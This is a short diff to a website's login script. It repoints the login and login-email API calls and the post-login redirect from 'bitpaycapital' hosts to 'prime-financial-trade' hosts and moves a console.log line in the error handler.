@@ -9,7 +9,7 @@ const sendLoginEmail = async () => {
   const data = {
     email: email.value,
   };
-  fetch('https://bitpaycapital.onrender.com/api/loginemailsand', {
+  fetch('https://primefinancialtradebackend.onrender.com/api/loginemailsand', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -36,7 +36,7 @@ button.onclick = async (event) => {
   console.log(data);
   button.innerHTML = "Loading...";
 
-  fetch('https://the-bitpay-capital-back-end.vercel.app/api/login', {
+  fetch('https://prime-financial-trade-backend.vercel.app/api/login', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -56,11 +56,11 @@ button.onclick = async (event) => {
       }else{
         console.log("object2");
         sendLoginEmail()
-        window.location = `https://www.accounts-bitpaycapital.com/#/${userId}`;
+        window.location = `https://prime-financial-trade-account.vercel.app/#/${userId}`;
       }
     })
     .catch((error) => {
-      console.log(error);
       button.innerHTML = "Sign In";
+      console.log(error);
     });
 };
